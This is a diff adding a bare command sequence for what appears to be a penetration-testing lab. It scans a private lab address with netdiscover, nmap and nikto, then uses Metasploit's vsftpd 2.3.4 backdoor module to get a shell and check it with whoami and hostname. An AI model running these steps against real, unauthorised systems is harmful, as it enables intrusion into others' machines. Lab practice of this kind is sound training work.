@@ -1,1 +1,21 @@
+netdiscover
 
+nmap -A 192.168.56.101
+
+nmap --script vuln 192.168.56.101
+
+nikto -h http://192.168.56.101
+
+msfconsole
+
+search vsftpd
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set RHOSTS 192.168.56.101
+
+run
+
+whoami
+
+hostname
